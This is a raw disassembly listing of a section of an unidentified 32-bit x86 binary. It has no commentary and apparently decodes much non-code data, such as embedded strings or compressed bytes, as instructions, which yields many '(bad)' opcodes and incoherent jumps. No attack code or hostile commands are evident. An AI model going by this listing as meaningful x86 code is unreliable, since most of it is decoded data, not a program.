  405f82:	loope  0x405fe7
  405f84:	je     0x405feb
  405f86:	jae    0x405f92
  405f88:	dec    ebp
  405f89:	jbe    0x405ff8
  405f8b:	addr16 je 0x405fae
  405f8e:	gs cs gs gs dec ebp
  405f93:	imul   edx,DWORD PTR [ebx+0x70],0x63656973
  405f9a:	popa   
  405f9b:	popa   
  405f9c:	cmp    eax,0x20737270
  405fa1:	outs   dx,DWORD PTR ds:[esi]
  405fa2:	data16 jb 0x406007
  405fa5:	jns    0x406016
  405fa7:	push   edi
  405fa8:	and    dl,BYTE PTR [edi+0x2f]
  405fab:	sub    DWORD PTR [eax],esp
  405fad:	jb     0x406006
  405faf:	and    BYTE PTR [edx+0x65],dh
  405fb2:	and    BYTE PTR [edx+0x73],ah
  405fb5:	jb     0x405fd7
  405fb7:	je     0x406026
  405fb9:	push   ebx
  405fba:	cmp    eax,0x6d626f73
  405fbf:	jbe    0x405fe1
  405fc1:	dec    ebp
  405fc2:	je     0x405fe4
  405fc4:	jae    0x405fe6
  405fc6:	cmp    al,0x65
  405fc8:	cs inc esp
  405fca:	bound  edi,QWORD PTR [edx]
  405fcc:	inc    ecx
  405fcd:	inc    esp
  405fce:	cs inc esp
  405fd0:	and    BYTE PTR ds:0xdf646565,cl
  405fd6:	or     BYTE PTR [edi],al
  405fd8:	sub    al,0x2a
  405fda:	test   DWORD PTR [esi-0x2426d5d5],eax
  405fe0:	imul   esi,DWORD PTR [edx+0x510c5343],0xffffffbf
  405fe7:	call   0xbf5839a9
  405fec:	push   0x25
  405fee:	icebp  
  405fef:	adc    BYTE PTR [esp+eax*1],al
  405ff2:	push   ss
  405ff3:	(bad)  
  405ff5:	add    al,0x9d
  405ff7:	rol    DWORD PTR [ebx],cl
  405ff9:	add    al,0x45
  405ffb:	lds    edx,FWORD PTR [edx]
  405ffd:	jmp    0x3e7f325c
  406002:	ret    
  406003:	pop    ss
  406004:	setns  BYTE PTR [ebp-0xa]
  406008:	mov    ch,0xb3
  40600a:	imul   edx,DWORD PTR [ebx],0xfffffff4
  40600d:	and    al,0x94
  40600f:	dec    edi
  406010:	mov    ebp,0x4545f2eb
  406015:	inc    ebp
  406016:	neg    BYTE PTR [ecx-0x42]
  406019:	add    BYTE PTR [esi+0x201e40e3],0x5e
  406020:	and    ebx,esi
  406022:	ffreep st(0)
  406024:	jmp    0x6fbd1076
  406029:	inc    edx
  40602a:	mov    ecx,0x8d506917
  40602f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406030:	retf   0x5b0b
  406033:	inc    ebp
  406034:	inc    ebp
  406035:	cmp    BYTE PTR [esi+eiz*2+0x45],cl
  406039:	inc    ebp
  40603a:	inc    ebp
	...
  406043:	add    BYTE PTR [ebx+ecx*1+0xc2],dl
  40604a:	add    BYTE PTR [eax],al
  40604c:	add    BYTE PTR [eax],al
  40604e:	add    BYTE PTR [eax],al
  406050:	rol    al,0x86
  406053:	xchg   BYTE PTR [edx-0x7e24945],bh
  406059:	push   esp
  40605a:	(bad)  
  40605c:	dec    esp
  40605d:	sbb    al,0x81
  40605f:	xor    al,0x55
  406061:	mov    ds:0x43931e87,eax
  406066:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406067:	dec    edi
  406068:	xchg   esp,eax
  406069:	and    al,al
  40606b:	shr    BYTE PTR [edi],0x4
  40606e:	rol    al,0x49
  406071:	jnp    0x406033
  406073:	shr    BYTE PTR [esp+edx*2-0x3bd62a69],0x19
  40607b:	dec    ebx
  40607c:	rcl    BYTE PTR [ecx*4+0x259ef071],0x16
  406084:	sub    eax,0x9f12a554
  406089:	jmp    0x406107
  40608b:	pop    edi
  40608c:	rol    BYTE PTR [eax],0xec
  40608f:	dec    edx
  406090:	pop    esp
  406091:	push   ebx
  406092:	add    BYTE PTR [eax],al
  406094:	add    BYTE PTR [eax+0x3a802910],al
  40609a:	fmul   DWORD PTR [esi+0x31]
  40609d:	or     BYTE PTR [eax-0x3],0x4a
  4060a1:	outs   dx,BYTE PTR ds:[esi]
  4060a2:	pusha  
  4060a3:	or     ebp,DWORD PTR [eax]
  4060a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060a6:	scas   al,BYTE PTR es:[edi]
  4060a7:	mov    BYTE PTR [edi],cl
  4060a9:	cli    
  4060aa:	sbb    cl,dl
  4060ac:	sbb    BYTE PTR [esp+ebx*1-0x4db5e188],dl
  4060b3:	mov    esi,0x69911c9
  4060b8:	add    BYTE PTR [eax],al
  4060ba:	leave  
  4060bb:	test   BYTE PTR [eax],al
  4060bd:	add    BYTE PTR [eax],al
  4060bf:	je     0x406135
  4060c1:	je     0x406137
  4060c3:	je     0x406139
  4060c5:	je     0x40613b
  4060c7:	je     0x4060ba
  4060c9:	daa    
  4060ca:	add    eax,DWORD PTR [eax]
	...
  4060d4:	add    BYTE PTR [eax],al
  4060d6:	xor    eax,0xecd35612
  4060db:	mov    edi,0x65b77327
  4060e0:	in     al,dx
  4060e1:	mov    ecx,cs
  4060e3:	dec    eax
  4060e4:	js     0x406114
  4060e6:	inc    eax
  4060e7:	popa   
  4060e8:	cmp    esi,DWORD PTR [ebx]
  4060ea:	out    0x4c,al
  4060ec:	mov    cl,0xa
  4060ee:	add    BYTE PTR [eax],al
  4060f0:	test   eax,0xed5ebc2c
  4060f5:	scas   eax,DWORD PTR es:[edi]
  4060f6:	add    ebp,DWORD PTR [esi-0x45ea75a8]
  4060fc:	ret    
  4060fd:	loop   0x406147
  4060ff:	int3   
  406100:	inc    ebx
  406101:	in     al,0x55
  406103:	push   ebp
  406104:	mov    al,ds:0x8df13228
  406109:	in     al,dx
  40610a:	push   ebx
  40610b:	xchg   ecx,eax
  40610c:	adc    eax,DWORD PTR [eax]
  40610e:	add    al,al
  406110:	mov    eax,0x9d00009f
  406115:	inc    edi
  406116:	fiadd  WORD PTR [eax]
  406118:	shl    BYTE PTR [edi+0xb],0xb5
  40611c:	xchg   DWORD PTR [ecx],eax
  40611e:	ins    DWORD PTR es:[edi],dx
  40611f:	inc    eax
  406120:	jle    0x4060e8
  406122:	sbb    esi,ebp
  406124:	(bad)  
  406125:	shr    cl,1
  406127:	stc    
  406128:	push   esi
  406129:	mov    ds:0x60ddef94,al
  40612e:	push   0xffffffb7
  406130:	pop    eax
  406132:	rol    al,0xb5
  406135:	lock rol al,0x3d
  406139:	cmp    eax,eax
  40613b:	rol    al,0x8
  40613e:	or     BYTE PTR [eax],cl
  406140:	or     BYTE PTR [eax],cl
  406142:	or     BYTE PTR [eax],cl
  406144:	or     BYTE PTR [eax],cl
  406146:	sbb    BYTE PTR [esi],bh
  406148:	mov    WORD PTR [ecx],?
  40614a:	mov    esp,0xc7feb64b
  40614f:	and    ebp,DWORD PTR [eax+eax*4+0xee0927d]
  406156:	xchg   esp,eax
  406157:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406158:	lds    esp,FWORD PTR [edi-0x522cbc31]
  40615e:	int3   
  40615f:	int3   
  406160:	int3   
  406161:	int3   
  406162:	int3   
  406163:	int3   
  406164:	int3   
  406165:	int3   
  406166:	int3   
  406167:	mov    ecx,DWORD PTR [ebx-0x5cfabea2]
  40616d:	mov    ecx,DWORD PTR [ebx-0x3ebf9d6e]
  406173:	imul   edx,DWORD PTR [esi],0x3db7116b
  406179:	push   ecx
  40617a:	loope  0x4061a9
  40617c:	fs and bl,dl
  40617f:	retf   
  406180:	mov    esp,0xb815d041
  406185:	lds    edi,FWORD PTR [ebx+0x45869fec]
  40618b:	xor    BYTE PTR [ebp-0x4ba52cd],dl
  406191:	sbb    ecx,DWORD PTR [ebx-0x74ec3c75]
  406197:	mov    esp,eax
  406199:	and    eax,0xc3008bd0
  40619e:	pop    esp
  40619f:	outs   dx,BYTE PTR ds:[esi]
  4061a0:	xor    bh,bl
  4061a2:	gs push ecx
  4061a4:	fdiv   DWORD PTR [edi-0x2a]
  4061a7:	push   ebx
  4061a8:	xchg   ecx,eax
  4061a9:	and    ecx,ebp
  4061ab:	xchg   BYTE PTR [ecx+0x4d325c91],ch
  4061b1:	add    eax,0xbd7d4c
  4061b6:	add    BYTE PTR [eax],al
  4061b8:	shl    cl,1
  4061ba:	or     DWORD PTR [edx],ebx
  4061bc:	ret    0x1af
  4061bf:	test   bl,al
  4061c1:	or     edi,esi
  4061c3:	fs test edx,0x9202bf02
  4061ca:	imul   ecx,DWORD PTR [edx],0xffffffaa
  4061cd:	into   
  4061ce:	aam    0x63
  4061d0:	mov    ch,BYTE PTR [edi]
  4061d2:	xchg   edx,eax
  4061d3:	ficomp DWORD PTR [ebx-0x7b990000]
  4061d9:	dec    ebx
  4061da:	add    BYTE PTR [eax],al
  4061dc:	add    BYTE PTR [ebx-0x74747475],cl
  4061e2:	mov    ecx,DWORD PTR [ebx-0x498f7475]
  4061e8:	push   0x0
  4061ed:	add    BYTE PTR [eax],al
  4061ef:	add    BYTE PTR [eax],al
  4061f1:	add    BYTE PTR [eax],al
  4061f3:	add    BYTE PTR [edx+0x34],dh
  4061f6:	push   esp
  4061f7:	and    al,0x99
  4061f9:	push   ss
  4061fa:	jle    0x4061a5
  4061fc:	xor    eax,0xdf276339
  406201:	mov    bh,0x66
  406203:	xchg   esi,eax
  406204:	mov    esi,0x6b2e93a9
  406209:	pusha  
  40620a:	repz aad 0x0
  40620d:	add    BYTE PTR [eax-0x6d],al
  406210:	add    BYTE PTR [eax],al
  406212:	mov    ds:0x6e00003f,al
  406217:	stc    
  406218:	addr16 mov eax,ds:0x4476
  40621c:	adc    DWORD PTR [esi-0x2e],ebp
  40621f:	fstp   TBYTE PTR [ebp+edx*1-0x24]
  406223:	imul   edi,DWORD PTR [esi],0x6f65220a
  406229:	das    
  40622a:	and    BYTE PTR [eiz*2+0x6d746565],bh
  406231:	jae    0x406287
  406233:	ds ds jb 0x40628a
  406237:	bound  esi,QWORD PTR [edx+0x22]
  40623a:	fs gs dec ebp
  40623d:	gs je  0x4062a7
  406240:	jb     0x406262
  406242:	push   esp
  406243:	jae    0x4062aa
  406245:	ins    BYTE PTR es:[edi],dx
  406246:	imul   ebp,DWORD PTR [edi+0x22],0x61200a6e
  40624d:	outs   dx,DWORD PTR ds:[esi]
  40624e:	gs jae 0x40625e
  406251:	jb     0x4062b8
  406253:	arpl   WORD PTR [edi+ebp*2+0x69],si
  406257:	jae    0x4062be
  406259:	and    cl,BYTE PTR [edx]
  40625b:	arpl   WORD PTR gs:[ebx+0x63],si
  40625f:	jb     0x4062ca
  406261:	jbe    0x4062d5
  406263:	bound  esp,QWORD PTR ds:[eax]
  406266:	and    BYTE PTR [eax],ah
  406268:	outs   dx,DWORD PTR ds:[si]
  40626a:	outs   dx,DWORD PTR ds:[si]
  40626c:	popa   
  40626d:	imul   ebp,DWORD PTR [ecx+0x65],0x66653c5b
  406274:	dec    ebp
  406275:	jne    0x4062dd
  406277:	bound  eax,QWORD PTR gs:[ebp+ebp*2+0x65]
  40627c:	inc    esp
  40627d:	inc    ebx
  40627e:	ins    BYTE PTR es:[edi],dx
  40627f:	gs and BYTE PTR ds:[ebx+0x73],dl
  406284:	imul   esp,DWORD PTR [edx+edi*2+0x65],0xffd8366
  40628c:	mov    dl,0x49
  40628e:	jb     0x4062aa
  406290:	ds dec ecx
  406292:	hlt    
  406293:	add    BYTE PTR [ebp-0x9],dh
  406296:	xchg   ebp,eax
  406297:	adc    BYTE PTR ds:0x90757575,0xb7
  40629e:	cs aaa 
  4062a0:	stc    
  4062a1:	cmp    ecx,ebx
  4062a3:	xchg   esp,eax
  4062a4:	inc    ecx
  4062a5:	inc    ecx
  4062a6:	cmp    eax,0xa73d52e1
  4062ab:	addr16 add eax,0x28540430
  4062b1:	push   0x7c
  4062b3:	adc    bl,ch
  4062b5:	mov    esp,0xb425cce7
  4062ba:	push   ecx
  4062bb:	aad    0xe9
  4062bd:	pop    ds
  4062be:	push   eax
  4062bf:	jne    0x406336
  4062c1:	fsubr  DWORD PTR [ecx+0x75]
  4062c4:	jne    0x40633b
  4062c6:	call   0xe9294bb3
  4062cb:	call   0x96294bb8
  4062d0:	xchg   DWORD PTR [esi+0x0],esi
	...
  4062db:	add    BYTE PTR [eax],al
  4062dd:	or     ebx,edi
  4062df:	xchg   ebx,eax
  4062e0:	mov    ecx,0x91877ff1
  4062e5:	and    al,0x4
  4062e7:	addr16 call 0x31337628
  4062ed:	push   eax
  4062ee:	fadd   st,st(2)
  4062f0:	xor    DWORD PTR ds:0x314beb,eax
  4062f6:	add    BYTE PTR [ecx+0x67],ah
  4062f9:	test   ah,dh
  4062fb:	aaa    
  4062fc:	pop    ebp
  4062fd:	leave  
  4062fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4062ff:	mov    ebx,0xf515286c
  406304:	jo     0x406337
  406306:	mov    bl,0xf
  406308:	adc    BYTE PTR [edi-0x52a31e3e],dh
  40630e:	or     DWORD PTR [ebp-0x5d],0x7f
  406312:	xchg   ebx,eax
  406313:	lahf   
  406314:	add    BYTE PTR [eax],al
  406316:	sub    dh,BYTE PTR ds:0x460000ed
  40631c:	sahf   
  40631d:	adc    eax,DWORD PTR [eax]
  40631f:	add    BYTE PTR [edx],al
  406321:	cmp    eax,0x580655e4
  406326:	and    cl,BYTE PTR [esi+0x787074bd]
  40632c:	ror    ah,cl
  40632e:	sti    
  40632f:	pop    ss
  406330:	jg     0x406307
  406332:	dec    eax
  406333:	jns    0x40635d
  406335:	inc    ebp
  406336:	mov    ebp,0x19
  40633b:	push   eax
  40633c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40633d:	add    BYTE PTR [eax],al
  40633f:	push   DWORD PTR [ebp+0x0]
  406342:	add    BYTE PTR [eax],al
  406344:	call   0xe9294c31
  406349:	call   0xa294c36
  40634e:	stos   DWORD PTR es:[edi],eax
  40634f:	adc    esi,0x3c153b38
  406355:	mov    ds:0xca51af44,al
  40635a:	mov    al,ds:0xd0d689b2
  40635f:	(bad)  
  406360:	and    DWORD PTR [esi],0x8b9876d8
  406366:	mov    ecx,DWORD PTR [ebx-0x74747475]
  40636c:	mov    ecx,DWORD PTR [ebx-0x62750001]
  406372:	fcmovnbe st,st(6)
  406374:	(bad)  
  406375:	jmp    DWORD PTR [edx]
  406377:	xchg   ebx,eax
  406378:	sub    eax,0x21a9cf26
  40637d:	retf   
  40637e:	pop    ebp
  40637f:	stc    
  406380:	in     al,dx
  406381:	in     eax,dx
  406382:	jne    0x406350
  406384:	and    DWORD PTR [esi],esi
  406386:	jnp    0x4063a3
  406388:	dec    ebx
  406389:	add    ah,BYTE PTR [ebx-0x24]
  40638c:	js     0x406394
  40638e:	mov    ecx,0x29dc895
  406393:	fcmovu st,st(3)
  406395:	daa    
  406396:	cwde   
  406397:	add    al,0x6
  406399:	(bad)  
  40639a:	inc    ebx
  40639c:	arpl   di,di
  40639e:	call   DWORD PTR [ecx-0x74007b47]
  4063a4:	xchg   BYTE PTR [eax],al
  4063a6:	lock jmp 0xbde5:0x8140b586
  4063ae:	mov    bl,0xbd
  4063b0:	sbb    esi,ecx
  4063b2:	ja     0x40639c
  4063b4:	aad    0x3a
  4063b6:	jo     0x40639e
  4063b8:	mov    dh,bh
  4063ba:	iret   
  4063bb:	in     al,dx
  4063bc:	mov    ecx,DWORD PTR [ebx-0x13265c75]
  4063c2:	cs sbb esi,esi
  4063c5:	jno    0x406363
  4063c7:	sar    DWORD PTR [eax-0x7f],0x98
  4063cb:	fist   DWORD PTR [ecx]
  4063cd:	xchg   ebp,eax
  4063ce:	cs leave 
  4063d0:	dec    edi
  4063d1:	push   0xffffff89
  4063d3:	jne    0x406396
  4063d5:	out    0x80,al
  4063d7:	ins    DWORD PTR es:[edi],dx
  4063d8:	or     esp,DWORD PTR [ebp+0x49]
  4063db:	sahf   
  4063dc:	mov    ecx,DWORD PTR [ebx-0x741527e9]
  4063e2:	mov    ecx,DWORD PTR [ebx-0x1]
  4063e8:	(bad)  
  4063e9:	(bad)  
  4063ea:	(bad)  
  4063eb:	(bad)  
  4063ec:	(bad)  
  4063ed:	jge    0x406430
  4063ef:	int    0x8b
  4063f1:	mov    ecx,DWORD PTR [ebx-0x74747475]
  4063f7:	mov    ecx,DWORD PTR [ebx-0x501b0000]
  4063fd:	push   es
  4063fe:	stc    
  4063ff:	mov    edi,0xad6e441a
  406404:	sbb    dl,cl
  406406:	test   BYTE PTR ds:0x9835e543,al
  40640c:	jo     0x4063de
  40640e:	jmp    0xe7e835a3
  406413:	add    BYTE PTR [eax],al
  406415:	mov    BYTE PTR cs:[eax],al
  406418:	add    BYTE PTR [ebx-0x50],cl
  40641b:	add    BYTE PTR [eax],al
  40641d:	cld    
  40641e:	mov    ds:0x95c06d44,eax
  406423:	push   ds
  406424:	cmp    BYTE PTR [ecx],cl
  406426:	jmp    DWORD PTR [esi+ebx*4+0x744dd86a]
  40642d:	push   es
  40642e:	inc    edi
  40642f:	in     al,0x50
  406431:	mov    esp,0xcdc8ab
  406436:	add    BYTE PTR [esp+edx*1+0x29],dl
  40643a:	stc    
  40643b:	add    BYTE PTR [eax],al
  40643d:	add    BYTE PTR [edx-0x44],ah
  406440:	add    ecx,DWORD PTR ds:0x63b97c5
  406446:	and    eax,0x5509ea1d
  40644b:	or     edx,edx
  40644d:	mov    ebp,0x949a8dc9
  406452:	scas   al,BYTE PTR es:[edi]
  406453:	or     al,0x8d
  406455:	(bad)
  406458:	das    
  406459:	xchg   bh,al
  40645b:	xlat   BYTE PTR ds:[ebx]
  40645c:	cmp    eax,0xffffffa5
  40645f:	sar    BYTE PTR [ebx],0x0
  406462:	add    BYTE PTR [edx],al
  406464:	fadd   DWORD PTR [eax]
  406466:	add    BYTE PTR [eax],al
  406468:	lea    ecx,[ebp-0x72727273]
  40646e:	lea    ecx,[ebp+0xaf5848d]
  406474:	inc    ebp
  406475:	inc    ebp
  406476:	inc    ebp
  406477:	inc    ebp
  406478:	inc    ebp
  406479:	inc    ebp
  40647a:	inc    ebp
  40647b:	inc    ebp
  40647c:	inc    ebp
  40647d:	add    BYTE PTR [eax],al
  40647f:	adc    DWORD PTR [ebp+0xf],0x10ca2410
  406486:	ds dec ebx
  406488:	mov    al,0x9c
  40648a:	jbe    0x4064e2
  40648c:	push   ecx
  40648d:	sbb    eax,0x3e0950da
  406492:	push   ecx
  406493:	clc    
  406494:	jle    0x406444
  406496:	rol    DWORD PTR [eax],cl
  406498:	add    dh,cl
  40649a:	clc    
  40649b:	or     dh,BYTE PTR [edx-0x13]
  40649e:	mov    WORD PTR [eax+0x2c],ds
  4064a1:	jge    0x40651d
  4064a3:	imul   eax,DWORD PTR [esi-0x6b],0xffffffa6
  4064a7:	push   0x195912e7
  4064ac:	pop    esp
  4064ad:	sbb    al,0xd6
  4064af:	popa   
  4064b0:	xchg   esp,eax
  4064b1:	int3   
  4064b2:	ds (bad) 
  4064b5:	mov    ah,0x0
  4064b7:	add    BYTE PTR [esi-0x34],cl
  4064ba:	sub    al,0x0
  4064bc:	add    BYTE PTR [edx+0x2f],bh
  4064bf:	fld    QWORD PTR [eax]
  4064c1:	mov    edi,DWORD PTR [esi-0x381df783]
  4064c7:	ror    DWORD PTR [edx+esi*4+0x305f0be5],1
  4064ce:	cdq    
  4064cf:	cmp    ebx,ebx
  4064d1:	test   BYTE PTR [ebx+0x45],dh
  4064d4:	adc    al,0x85
  4064d6:	adc    dl,BYTE PTR [esi]
  4064d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064d9:	test   DWORD PTR [ebx+0x55858b8b],0x7b5a8b8b
  4064e3:	mov    ecx,DWORD PTR [ebx-0x72727275]
  4064e9:	lea    ecx,[ebp-0x72727273]
  4064ef:	and    eax,edi
  4064f1:	popf   
  4064f2:	popa   
  4064f3:	stos   DWORD PTR es:[edi],eax
  4064f4:	es xor al,0xa6
  4064f7:	call   0x5c07:0xcc3dc76b
  4064fe:	xor    eax,0x6c379058
  406503:	scas   al,BYTE PTR es:[edi]
  406504:	cwde   
  406505:	jbe    0x4064a4
	...
  40650f:	add    al,ch
  406511:	call   0x6bded74d
  406516:	call   0xf04e7103
  40651b:	xchg   ecx,eax
  40651c:	pop    ecx
  40651d:	push   edx
  40651e:	xor    al,BYTE PTR [ecx+0x7b]
  406521:	sub    dx,bx
  406524:	push   ss
  406525:	xor    ch,dl
  406527:	jp     0x4064d4
  406529:	xor    bl,bh
  40652b:	mov    ds:0x106af467,al
  406530:	dec    ecx
  406531:	add    eax,0xfaeab740
  406536:	add    eax,0x6a62bc05
  40653b:	call   0xe8556128
  406540:	call   0xe8a16d5f
  406545:	add    BYTE PTR [esi-0x18c5665c],al
  40654b:	mov    bl,al
  40654d:	sbb    BYTE PTR [edi],cl
  40654f:	dec    eax
  406550:	cmp    eax,0x3ca32cc0
  406555:	aaa    
  406556:	inc    esi
  406557:	setbe  BYTE PTR [ecx-0x5a]
  40655b:	ins    BYTE PTR es:[edi],dx
  40655c:	ror    DWORD PTR [edx+0x0],0x0
  406560:	add    cl,cl
  406562:	aaa    
  406563:	inc    eax
  406564:	push   eax
  406565:	pmaxub mm4,mm0
  406568:	ja     0x4065de
  40656a:	je     0x40658b
  40656c:	sub    ecx,DWORD PTR [ecx]
  40656e:	out    dx,eax
  40656f:	retf   0x736a
  406572:	je     0x4065e3
  406574:	jb     0x4065b0
  406576:	and    BYTE PTR [edx+0x41],dh
  406579:	arpl   WORD PTR [ebp+0x65],sp
  40657c:	cmp    ch,BYTE PTR [esi+0x3a]
  40657f:	dec    ebp
  406580:	bound  ebp,QWORD PTR [ebp+0x70]
  406583:	push   ebx
  406584:	outs   dx,BYTE PTR ds:[esi]
  406585:	jbe    0x4065c3
  406587:	gs push ebx
  406589:	imul   eax,DWORD PTR [esi+edi*1+0x20],0x68692e6e
  406591:	and    BYTE PTR [edi+0x77],ch
  406594:	imul   esi,DWORD PTR [esi+eiz*2+0x76],0x682c2072
  40659c:	or     eax,0x74733c76
  4065a1:	outs   dx,DWORD PTR ds:[esi]
  4065a2:	arpl   WORD PTR [ebp+0x65],si
  4065a5:	imul   esp,DWORD PTR [eax],0x410d6774
  4065ab:	cs gs or eax,0x62726e63
  4065b2:	or     ah,BYTE PTR [esi+0x20]
  4065b5:	outs   dx,DWORD PTR ds:[esi]
  4065b6:	or     dh,BYTE PTR [edx+0x65]
  4065b9:	and    BYTE PTR gs:[ecx+0x43],al
  4065bd:	jb     0x4065ed
  4065bf:	and    BYTE PTR [esi+0x4d],ch
  4065c2:	bound  ebp,QWORD PTR [edi]
  4065c4:	ins    DWORD PTR es:[edi],dx
  4065c5:	and    dh,BYTE PTR [ebp+eiz*2+0x3c]
  4065c9:	and    BYTE PTR gs:[ebp+0x73],ah
  4065cd:	or     ah,BYTE PTR [edx+0x69]
  4065d0:	outs   dx,DWORD PTR ds:[esi]
  4065d1:	jae    0x406602
  4065d3:	cmp    al,0x6e
  4065d5:	sub    DWORD PTR [esi+0x6d],esi
  4065d8:	ins    DWORD PTR es:[edi],dx
  4065d9:	ds ins DWORD PTR es:[edi],dx
  4065db:	gs push ebx
  4065dd:	push   0x76726562
  4065e2:	arpl   WORD PTR [eax],sp
  4065e4:	and    ch,BYTE PTR [edi+0x4d]
  4065e7:	mov    esi,0xa4d6b2df
  4065ec:	sub    DWORD PTR [esi+0x79],0x8f255ac3
  4065f3:	add    BYTE PTR [eax],al
  4065f5:	imul   DWORD PTR [edi-0x6a]
  4065f8:	add    BYTE PTR [eax],al
  4065fa:	add    ah,cl
  4065fc:	int3   
  4065fd:	int3   
  4065fe:	int3   
  4065ff:	int3   
  406600:	int3   
  406601:	int3   
  406602:	int3   
  406603:	int3   
  406604:	and    eax,0xca72
  406609:	add    BYTE PTR [eax],al
  40660b:	add    BYTE PTR [eax],al
  40660d:	add    BYTE PTR [eax],al
  40660f:	add    BYTE PTR [edi],cl
  406611:	movzx  ebp,WORD PTR ds:0x5aefb619
  406618:	jmp    0x536866c7
  40661d:	lea    esp,[ecx]
  40661f:	imul   ebp,DWORD PTR [ecx-0x12],0xffffffad
  406623:	in     al,dx
  406624:	je     0x406645
  406626:	icebp  
  406627:	pop    eax
  406628:	mov    edx,0x660f0f7e
  40662d:	pop    ecx
  40662e:	(bad)  
  40662f:	cmovne esi,DWORD PTR [edx+0xf]
  406633:	orps   xmm6,XMMWORD PTR [ebp+0x1154e8f3]
  40663a:	(bad)  
  40663c:	lods   al,BYTE PTR ds:[esi]
  40663d:	push   ss
  40663e:	pop    eax
  40663f:	cmp    DWORD PTR [esi+0x40f522b5],ecx
  406645:	xchg   esi,eax
  406646:	scas   al,BYTE PTR es:[edi]
  406647:	jns    0x4066aa
  406649:	fbld   TBYTE PTR [edx+0xb]
  40664c:	jnp    0x848bfbf4
  406652:	mov    ecx,DWORD PTR [ebx+0x2e0868b]
  406658:	push   0x6a
  40665a:	pop    edx
  40665b:	or     BYTE PTR [esi+0x2a683048],bl
  406661:	sub    cl,BYTE PTR [ecx-0x22]
  406664:	jae    0x406605
  406666:	cli    
  406667:	out    dx,al
  406668:	ret    
  406669:	mov    edi,0xdc04334
  40666e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40666f:	or     DWORD PTR ds:[ebx-0x314ea5c],ebx
  406676:	sbb    edx,DWORD PTR ds:0xe03a8b8b
  40667c:	mov    ecx,DWORD PTR [ebx+0x8b]
  406682:	add    BYTE PTR [eax],al
  406684:	add    BYTE PTR [eax],al
  406686:	add    BYTE PTR [eax],al
  406688:	add    BYTE PTR [eax+0x3],0x74
  40668c:	je     0x406702
  40668e:	je     0x406704
  406690:	je     0x406706
  406692:	je     0x406708
  406694:	add    DWORD PTR [ebx-0x2fddd464],0x54
  40669b:	mov    dl,0xa1
  40669d:	(bad)  
  40669e:	rcr    esp,1
  4066a0:	fimul  WORD PTR [edi+0x5c3b6472]
  4066a6:	sbb    esp,DWORD PTR [ecx+0x36]
  4066a9:	inc    ebx
  4066aa:	and    al,dh
  4066ac:	xchg   edx,ebp
  4066ae:	add    DWORD PTR [ebx-0x3307539],0x6
  4066b5:	adc    ebx,DWORD PTR fs:[eax-0x1cb824b1]
  4066bc:	cli    
  4066bd:	adc    cl,0xc
  4066c0:	cmp    BYTE PTR [edx+ebp*4-0x106d31c7],dl
  4066c7:	pushf  
  4066c8:	ret    
  4066c9:	push   esi
  4066ca:	test   al,0x7e
  4066cc:	push   edx
  4066cd:	add    DWORD PTR [ebx-0x7ce89cb7],0xffffff83
  4066d4:	sbb    al,0x4a
  4066d6:	jl     0x40665b
  4066d8:	pand   mm5,QWORD PTR [edx]
  4066db:	push   esp
  4066dc:	mov    bl,0x9c
  4066de:	mov    dl,0x74
  4066e0:	lahf   
  4066e1:	xchg   eax,esi
  4066e3:	inc    esp
  4066e4:	or     edx,DWORD PTR [esi+0x3dede6e7]
  4066ea:	jnp    0x4066ed
  4066ec:	xlat   BYTE PTR ds:[ebx]
  4066ed:	test   eax,0xff6b1ac
  4066f2:	(bad)  
  4066f3:	(bad)  
  4066f5:	out    dx,eax
  4066f6:	(bad)  
  4066f7:	packuswb mm1,mm5
  4066fa:	(bad)  
  4066fb:	(bad)  
  4066fc:	jnp    0x8bcbf28d
  406702:	mov    ecx,DWORD PTR [ebx+0x14bf8b8b]
  406708:	add    ch,BYTE PTR [edx+0x10bf7c58]
  40670e:	sti    
  40670f:	daa    
  406710:	jle    0x406720
  406712:	fist   WORD PTR [ebx-0x58]
  406715:	ror    DWORD PTR [ebx],cl
  406717:	xor    ah,BYTE PTR [edx+edi*1+0x4b]
  40671b:	stc    
  40671c:	(bad)  
  40671d:	add    BYTE PTR fs:[eax],al
  406720:	add    BYTE PTR [eax],al
  406722:	add    BYTE PTR [eax],al
  406724:	add    BYTE PTR [eax],al
  406726:	add    BYTE PTR [ebx+0x1879b18b],cl
  40672c:	ins    BYTE PTR es:[edi],dx
  40672d:	mov    ecx,DWORD PTR [ebx+0x5244ae92]
  406733:	push   ss
  406734:	ins    DWORD PTR es:[edi],dx
  406735:	je     0x40672c
  406737:	lods   al,BYTE PTR ds:[esi]
  406738:	sbb    eax,0x7cc674ce
  40673d:	retf   
  40673e:	mov    WORD PTR [edi-0x42867255],es
  406744:	dec    esp
  406745:	adc    BYTE PTR [esi-0x26],cl
  406748:	test   BYTE PTR [ebx],bl
  40674a:	or     bl,ch
  40674c:	pop    ebx
  40674d:	mov    ebx,0xfcd088c8
  406752:	mov    ecx,DWORD PTR [ebx-0x747487ac]
  406758:	jl     0x406778
  40675a:	mov    eax,DWORD PTR es:[eax]
  40675d:	(bad)  
  40675e:	adc    ebp,DWORD PTR [edi-0x46]
  406761:	shl    edi,0x44
  406764:	mov    ah,0x95
  406766:	outs   dx,DWORD PTR ds:[esi]
  406767:	push   ebx
  406768:	mov    edi,fs
  40676a:	add    eax,0x6e60d9c0
  40676f:	sbb    al,0x42
  406771:	and    DWORD PTR [esi+0x54],esi
  406774:	lea    eax,[eax]
  406776:	add    BYTE PTR [eax],al
  406778:	mov    al,0x83
  40677a:	stos   DWORD PTR es:[edi],eax
  40677b:	sbb    eax,0xbe7b4884
  406780:	xor    eax,0x715e7ed4
  406785:	push   eax
  406786:	adc    edx,ecx
  406788:	retf   
  406789:	mov    edi,0xa072e728
  40678e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40678f:	jmp    0x406732
  406791:	shl    DWORD PTR [ecx*2+0x600000b2],1
  406798:	push   ss
  406799:	dec    esi
  40679a:	add    BYTE PTR [eax],al
  40679c:	add    BYTE PTR [ebp+0x75],dh
  40679f:	jne    0x406816
  4067a1:	jne    0x406818
  4067a3:	jne    0x40681a
  4067a5:	jne    0x406823
  4067a7:	pop    es
  4067a8:	cs add al,0x4
